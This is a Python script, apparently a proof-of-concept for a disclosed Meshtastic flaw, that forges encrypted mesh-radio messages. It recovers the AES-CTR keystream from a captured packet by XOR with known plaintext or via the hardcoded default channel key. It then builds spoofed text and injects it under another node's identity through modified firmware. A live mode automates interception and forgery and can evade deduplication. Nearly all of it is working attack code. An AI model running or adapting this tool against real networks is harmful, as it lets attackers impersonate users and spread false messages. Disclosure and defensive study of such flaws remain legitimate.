#!/usr/bin/env -S uv run
# /// script
# requires-python = ">=3.10"
# dependencies = [
#   "meshtastic",
#   "pycryptodome",
# ]
# ///
"""
forge.py — End-to-end AES-CTR ciphertext forgery

Closes the loop on GitHub Issue #4030 live. Captures an encrypted packet from
the mesh, recovers the AES-CTR keystream, constructs a forged ciphertext with
arbitrary content, and reinjects it with the SAME (from_node, packet_id) nonce.
Recipient nodes decrypt the forged ciphertext and display the target message,
believing it came from the original sender.

THE ATTACK:
  nonce = (packet_id || from_node) — both in the cleartext packet header.
  keystream = AES-CTR(PSK, nonce, zeros)  — derivable with PSK
  OR keystream = ciphertext XOR encode_pb(known_plaintext)  — NO PSK NEEDED
  forged = keystream XOR encode_pb(target)

No MAC = no integrity. The forged ciphertext is indistinguishable from a
legitimate packet on recipient nodes.

Requires:
  - Evil firmware with EVIL_ALLOW_FROM_OVERRIDE=1  (from field override)
  - Non-zero packet IDs pass through firmware as-is  (already the case)
  - Packets sent with encrypted_tag skip re-encryption  (Router.cpp:356)

Modes:
  --live    Listen for packets, decrypt with PSK, forge and inject automatically.
  (manual)  Provide --from, --packet-id, --ciphertext, --known-plaintext, --target.

Usage:
    # Live: intercept default-channel messages, forge to target string
    python tools/forge.py --port /dev/cu.SLAB_USBtoUART --evil \\
        --live --decrypt-default --target "EVIL NODE WAS HERE"

    # Live dry run: show forgery math without injecting
    python tools/forge.py --port /dev/cu.SLAB_USBtoUART \\
        --live --decrypt-default --target "EVIL NODE WAS HERE" --dry-run

    # Manual: provide pre-captured ciphertext and known plaintext (no PSK needed)
    python tools/forge.py --port /dev/cu.SLAB_USBtoUART --evil \\
        --from 0x12345678 --packet-id 0xABCD1234 \\
        --ciphertext <hex> --known-plaintext "Hello, world!" \\
        --target "EVIL NODE WAS HERE"

    # Manual dry run: compute forgery without connecting or injecting
    python tools/forge.py \\
        --from 0x12345678 --packet-id 0xABCD1234 \\
        --ciphertext <hex> --known-plaintext "Hello, world!" \\
        --target "EVIL NODE WAS HERE" --dry-run
"""

import argparse
import datetime
import signal
import struct
import sys
import time

from pubsub import pub

from common import add_connection_args, build_interface, evil_mode, print_banner


# Default channel PSK (AQ== alias)
DEFAULT_PSK = bytes([0xd4, 0xf1, 0xbb, 0x3a, 0x20, 0x29, 0x07, 0x59,
                     0xf0, 0xbc, 0xff, 0xab, 0xcf, 0x4e, 0x69, 0x01])


# ─────────────────────────────────────────────────────────────────────────────
# Crypto helpers
# ─────────────────────────────────────────────────────────────────────────────

def meshtastic_nonce(packet_id: int, from_node: int) -> bytes:
    """16-byte AES-CTR nonce: packet_id (uint64 LE) || from_node (uint32 LE) || 0."""
    return struct.pack("<QII", packet_id & 0xFFFFFFFFFFFFFFFF, from_node & 0xFFFFFFFF, 0)


def aes_ctr_crypt(key: bytes, nonce: bytes, data: bytes) -> bytes:
    from Crypto.Cipher import AES
    cipher = AES.new(key, AES.MODE_CTR, nonce=b"", initial_value=nonce)
    return cipher.encrypt(data)


def xor_bytes(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def encode_text_pb(text: str) -> bytes:
    """
    Hand-encode a Meshtastic Data protobuf for a TEXT_MESSAGE_APP payload.
    Data { portnum=1 (field 1 varint), payload=text (field 3 length-delimited) }
    """
    text_bytes = text.encode("utf-8")
    portnum_field = bytes([0x08, 0x01])   # field 1, wire 0, value 1 (TEXT_MESSAGE_APP)
    payload_tag   = bytes([0x1a])          # field 3, wire 2
    # varint-encode length
    n = len(text_bytes)
    varint = []
    while True:
        bits = n & 0x7F
        n >>= 7
        if n:
            varint.append(bits | 0x80)
        else:
            varint.append(bits)
            break
    return portnum_field + payload_tag + bytes(varint) + text_bytes


def forge(ciphertext: bytes, known_pb: bytes, target_pb: bytes) -> tuple[bytes, bytes]:
    """
    Recover keystream via XOR, then forge target ciphertext.
    Returns (forged_ciphertext, recovered_keystream).
    Works without the PSK — just ciphertext and known plaintext protobuf.
    """
    ks = xor_bytes(ciphertext, known_pb)
    min_len = min(len(ks), len(target_pb))
    forged = xor_bytes(ks[:min_len], target_pb[:min_len])
    return forged, ks


# ─────────────────────────────────────────────────────────────────────────────
# Injection
# ─────────────────────────────────────────────────────────────────────────────

def inject_forged(iface, from_node: int, packet_id: int, channel: int,
                  hop_limit: int, forged_ciphertext: bytes):
    """
    Inject a forged packet using pre-computed encrypted bytes.

    Key points:
      - packet.encrypted sets which_payload_variant = encrypted_tag
      - Firmware skips re-encryption when encrypted_tag is set (Router.cpp:356)
      - Non-zero packet_id passes through without overwrite (MeshService.cpp:198)
      - Non-zero from passes through with EVIL_ALLOW_FROM_OVERRIDE
    """
    import meshtastic.protobuf.mesh_pb2 as mesh_pb2

    packet = mesh_pb2.MeshPacket()
    setattr(packet, "from", from_node)     # requires EVIL_ALLOW_FROM_OVERRIDE
    packet.to        = 0xFFFFFFFF          # broadcast
    packet.id        = packet_id           # same ID → same nonce → correct decryption
    packet.channel   = channel
    packet.hop_limit = hop_limit
    packet.hop_start = hop_limit
    packet.want_ack  = False
    packet.encrypted = forged_ciphertext   # sets encrypted_tag; firmware won't re-encrypt

    toRadio = mesh_pb2.ToRadio()
    toRadio.packet.CopyFrom(packet)
    iface._sendToRadio(toRadio)


# ─────────────────────────────────────────────────────────────────────────────
# Live mode
# ─────────────────────────────────────────────────────────────────────────────

class LiveForger:
    def __init__(self, iface, psk: bytes, target: str, channel: int,
                 hop_limit: int, dry_run: bool, max_forge: int, fresh_id: bool):
        self.iface      = iface
        self.psk        = psk
        self.target     = target
        self.channel    = channel
        self.hop_limit  = hop_limit
        self.dry_run    = dry_run
        self.max_forge  = max_forge
        self.fresh_id   = fresh_id
        self.forged     = 0
        self.running    = True

    def on_receive(self, packet, interface):
        if not self.running:
            return
        if self.max_forge > 0 and self.forged >= self.max_forge:
            return

        # Only act on text messages the library decrypted for us
        decoded = packet.get("decoded", {})
        text = decoded.get("text")
        if text is None:
            return

        from_node  = packet.get("from", 0)
        packet_id  = packet.get("id", 0)
        channel    = packet.get("channel", 0)

        ts = datetime.datetime.now().isoformat(timespec="milliseconds")
        print(f"\n[CAPTURE] {ts}")
        print(f"  from=!{from_node:08x}  id=0x{packet_id:08x}  ch={channel}")
        print(f"  plaintext: '{text}'")

        target_pb = encode_text_pb(self.target)

        if self.fresh_id:
            # Fresh-ID mode: generate a new random packet ID to bypass recipient dedup.
            # Recipients record (from, id) pairs; the original ID is already in their
            # dedup table, so a forged packet with the same ID would be silently dropped.
            # With a new ID we use a different nonce, so PSK encryption is required.
            import os as _os
            inject_id = int.from_bytes(_os.urandom(4), "little") or 1  # non-zero
            new_nonce = meshtastic_nonce(inject_id, from_node)
            forged_ct = aes_ctr_crypt(self.psk, new_nonce, target_pb)
            print(f"  [fresh-id] inject_id=0x{inject_id:08x}  (bypasses recipient dedup)")
            print(f"  forged ({len(forged_ct)}B): {forged_ct.hex()}")
            inject_packet_id = inject_id
        else:
            # Same-ID mode: reuse the original packet_id/nonce.
            # Demonstrates keystream recovery without PSK, but recipient dedup will
            # likely drop it if recipients already relayed the original.
            nonce      = meshtastic_nonce(packet_id, from_node)
            known_pb   = encode_text_pb(text)
            max_needed = max(len(known_pb), len(target_pb))
            keystream  = aes_ctr_crypt(self.psk, nonce, bytes(max_needed))
            min_len    = min(len(keystream), len(target_pb))
            forged_ct  = xor_bytes(keystream[:min_len], target_pb[:min_len])

            if len(target_pb) > len(known_pb):
                print(f"  [!] Target longer than captured ({len(target_pb)} > {len(known_pb)} bytes) — "
                      f"truncated to {min_len}B")

            print(f"  keystream ({len(keystream)}B): {keystream[:min_len].hex()}")
            print(f"  forged ({len(forged_ct)}B):    {forged_ct.hex()}")
            inject_packet_id = packet_id

        print(f"  target: '{self.target}'")

        if self.dry_run:
            print(f"  [DRY RUN] Would inject: from=!{from_node:08x} id=0x{inject_packet_id:08x}")
            return

        print(f"  [INJECT] Sending forged packet...")
        inject_forged(self.iface, from_node, inject_packet_id, channel,
                      self.hop_limit, forged_ct)
        self.forged += 1
        print(f"  [INJECT] Done. ({self.forged}/{self.max_forge if self.max_forge else '∞'})")


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="End-to-end AES-CTR ciphertext forgery (Issue #4030)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__.split("Usage:")[0].strip(),
    )

    # Connection args — optional (manual dry-run needs no device)
    add_connection_args(parser, require_port=False)
    parser.add_argument("--dry-run", action="store_true",
                        help="Compute forgery math without injecting anything")

    # Mode
    mode_grp = parser.add_argument_group("Mode")
    mode_grp.add_argument("--live", action="store_true",
                          help="Listen for incoming packets and forge automatically")
    mode_grp.add_argument("--max-forge", type=int, default=1,
                          help="Max packets to forge in live mode (0=unlimited, default: 1)")
    mode_grp.add_argument("--fresh-id", action="store_true",
                          help=(
                              "Live mode: generate a new random packet ID instead of reusing the "
                              "original. Recipients deduplicate on (from, id); using the same ID "
                              "as the original packet means recipients who already saw it will "
                              "drop the forged copy. --fresh-id bypasses this at the cost of "
                              "requiring PSK to re-encrypt with the new nonce. Recommended for "
                              "live demos where recipients are already in range of the sender."
                          ))

    # Key material
    key_grp = parser.add_argument_group("Key material (for live mode or verification)")
    key_grp.add_argument("--decrypt-default", action="store_true",
                         help="Use default PSK (AQ== / d4f1bb3a...) — required for live mode")
    key_grp.add_argument("--psk", metavar="HEX",
                         help="Channel PSK as hex string")

    # Manual mode: pre-captured packet
    man_grp = parser.add_argument_group("Manual mode (pre-captured packet, no PSK needed)")
    man_grp.add_argument("--from", dest="from_node", metavar="NODE_ID",
                         help="Source node ID hex (e.g. 0x12345678)")
    man_grp.add_argument("--packet-id", type=lambda x: int(x, 0), metavar="HEX",
                         help="Packet ID hex (e.g. 0xABCD1234)")
    man_grp.add_argument("--ciphertext", metavar="HEX",
                         help="Captured ciphertext as hex string")
    man_grp.add_argument("--known-plaintext", metavar="TEXT",
                         help="Known or guessed plaintext (UTF-8 text, not hex)")

    # Common output
    parser.add_argument("--target", default="EVIL NODE WAS HERE",
                        help="Target message to forge (default: 'EVIL NODE WAS HERE')")
    parser.add_argument("--channel", type=int, default=0,
                        help="Channel index for injection (default: 0)")
    parser.add_argument("--hop-limit", type=int, default=3, choices=range(0, 8),
                        metavar="{0..7}", help="Hop limit for injected packet (default: 3)")

    args = parser.parse_args()

    # Resolve PSK
    psk = None
    if args.decrypt_default:
        psk = DEFAULT_PSK
        print(f"[*] PSK: default AQ== ({DEFAULT_PSK.hex()})")
    elif args.psk:
        psk = bytes.fromhex(args.psk)
        print(f"[*] PSK: {psk.hex()}")

    try:
        from Crypto.Cipher import AES
    except ImportError:
        print("[!] pycryptodome required: pip install pycryptodome")
        sys.exit(1)

    # ── Live mode ──────────────────────────────────────────────────────────────
    if args.live:
        if not (args.port or args.host):
            parser.error("--live requires --port or --host")
        if not psk:
            parser.error("--live requires --decrypt-default or --psk")
        if not evil_mode(args) and not args.dry_run:
            print("[!] WARNING: --evil not set. Injection requires evil firmware.")
            print("[!] Add --dry-run to compute without injecting, or --evil to inject.")
            print()

        print("[*] Connecting...")
        iface = build_interface(args)
        time.sleep(2)
        print_banner(iface, args, "forge.py — live AES-CTR forgery")

        forger = LiveForger(
            iface=iface,
            psk=psk,
            target=args.target,
            channel=args.channel,
            hop_limit=args.hop_limit,
            dry_run=args.dry_run,
            max_forge=args.max_forge,
            fresh_id=args.fresh_id,
        )

        pub.subscribe(forger.on_receive, "meshtastic.receive")

        print(f"[*] Listening for text messages...")
        print(f"[*] Target: '{args.target}'")
        if args.dry_run:
            print("[*] DRY RUN — forgery computed but not injected")
        print("[*] Ctrl+C to stop")
        print()

        def handle_sigint(sig, frame):
            forger.running = False

        signal.signal(signal.SIGINT, handle_sigint)

        while forger.running and (args.max_forge == 0 or forger.forged < args.max_forge):
            time.sleep(0.1)

        print(f"\n[*] Done. Forged {forger.forged} packet(s).")
        iface.close()
        return

    # ── Manual mode ────────────────────────────────────────────────────────────
    if not all([args.from_node, args.packet_id is not None,
                args.ciphertext, args.known_plaintext]):
        parser.error(
            "Specify --live for live mode, or provide "
            "--from, --packet-id, --ciphertext, and --known-plaintext for manual mode."
        )

    from_node  = int(args.from_node, 16)
    packet_id  = args.packet_id
    ciphertext = bytes.fromhex(args.ciphertext)
    nonce      = meshtastic_nonce(packet_id, from_node)
    known_pb   = encode_text_pb(args.known_plaintext)
    target_pb  = encode_text_pb(args.target)

    # Keystream recovery — NO PSK NEEDED
    forged_ct, keystream = forge(ciphertext, known_pb, target_pb)
    min_len = min(len(keystream), len(target_pb))

    print()
    print("─" * 68)
    print("MANUAL FORGERY — no PSK required")
    print("─" * 68)
    print(f"  from_node:       !{from_node:08x}")
    print(f"  packet_id:       0x{packet_id:08x}")
    print(f"  nonce:           {nonce.hex()}")
    print()
    print(f"  known_plaintext: '{args.known_plaintext}'")
    print(f"  known_pb ({len(known_pb):>3}B): {known_pb.hex()}")
    print(f"  ciphertext ({len(ciphertext):>3}B): {ciphertext.hex()}")
    print()
    print(f"  keystream ({len(keystream):>3}B): {keystream.hex()}")
    print(f"  target:          '{args.target}'")
    print(f"  target_pb ({len(target_pb):>3}B): {target_pb.hex()}")
    print(f"  forged ({len(forged_ct):>3}B):    {forged_ct.hex()}")

    if len(target_pb) > len(known_pb):
        print(f"\n  [!] Target ({len(target_pb)}B) longer than known plaintext ({len(known_pb)}B).")
        print(f"  [!] Forged {min_len}B. Use shorter --target or longer --known-plaintext.")

    # Verify with PSK if available
    if psk:
        decrypted = aes_ctr_crypt(psk, nonce, forged_ct)
        print()
        print(f"  [VERIFY] decrypt(forged, PSK) = {decrypted.hex()}")
        try:
            # Skip protobuf framing: portnum (2B) + payload tag (1B) + varint len + text
            if len(decrypted) > 4 and decrypted[0] == 0x08 and decrypted[2] == 0x1a:
                text_start = 4
                text = decrypted[text_start:].decode("utf-8", errors="replace")
                print(f"  [VERIFY] decoded text: '{text}'")
        except Exception:
            pass

    if args.dry_run:
        print(f"\n  [DRY RUN] Would inject: from=!{from_node:08x} id=0x{packet_id:08x} ch={args.channel}")
        return

    if not (args.port or args.host):
        print("\n[*] No --port/--host — add one to inject the forged packet.")
        return

    if not evil_mode(args):
        print("\n[!] --evil required for injection (EVIL_ALLOW_FROM_OVERRIDE firmware).")
        return

    print(f"\n[*] Connecting to inject...")
    iface = build_interface(args)
    time.sleep(2)
    print_banner(iface, args, "forge.py — manual inject")
    inject_forged(iface, from_node, packet_id, args.channel, args.hop_limit, forged_ct)
    print(f"[*] Forged packet injected: from=!{from_node:08x} id=0x{packet_id:08x}")
    iface.close()


if __name__ == "__main__":
    main()
